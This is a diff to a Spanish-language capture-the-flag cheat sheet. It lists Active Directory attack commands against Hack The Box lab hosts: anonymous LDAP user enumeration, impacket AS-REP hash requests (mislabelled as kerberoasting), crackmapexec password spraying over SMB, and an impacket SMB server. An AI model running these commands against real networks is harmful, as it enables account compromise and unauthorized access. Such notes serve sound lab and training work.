@@ -32,11 +32,17 @@ ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local" -s su
 ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local"  | grep sAMAccountName: --> te saca solo lista de usuarios
 
 ```
-### COMPROBAR USUARIOS/PASSWD
+### ENUMERAR USUARIOS/PASSWD
 ```
+impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
+crackmapexec smb 10.10.10.161 --users
 crackmapexec smb 10.10.10.169 -u ./users -p password --no-bruteforce ---> te comprueba una lista de usuarios contra una lista de passwd
 crackmapexec smb 10.10.10.169 -u ./users -p Welcome123! --no-bruteforce ---> te comprueba una lista de usuarios contra un passwd en concreto
-
+```
+### IMPACKET
+sudo impacket-smbserver share ./
+impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
+```
 ```
 ### NMAP
 ```
